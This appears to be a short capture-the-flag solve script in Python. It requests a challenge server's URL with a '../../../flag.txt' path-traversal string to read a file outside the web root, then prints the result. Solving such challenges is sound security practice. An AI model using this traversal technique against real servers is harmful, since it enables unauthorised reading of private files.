import requests

r = requests.get("http://litctf.org:31778/?../../../flag.txt")

print(r.text)
